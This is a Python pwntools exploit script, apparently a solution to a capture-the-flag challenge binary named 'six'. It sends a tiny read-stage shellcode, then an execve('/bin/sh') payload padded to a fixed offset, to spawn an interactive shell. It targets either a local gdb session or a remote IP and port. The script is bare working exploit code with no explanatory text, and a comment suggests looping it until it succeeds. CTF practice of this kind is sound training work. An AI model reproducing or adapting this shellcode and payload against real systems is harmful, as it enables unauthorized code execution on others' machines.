#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./six"
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    #  io = process("./six")
    io = gdb.debug("./six", gdbscript = '''
            bpie 0xC95
            c
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            si 
            ''')
else:
    io = remote("49.4.79.0", 31166)

if __name__ == "__main__":
    read = asm('''
            push rsp
            pop rsi
            mov edx, esi
            syscall
            ''')
    assert len(read) < 7
    io.sendafter("shellcode:\n", read)

    shell = asm('''
            mov eax, 0x3b
            mov rdi, rsi
            xor rdx, rdx
            xor rsi, rsi
            syscall
            ''')

    payload = "/bin/sh\0".ljust(0xb36, '\0') + shell
    #  pause()
    io.sendline(payload)

    io.interactive()
    # $ while true; do python exp.py r; done
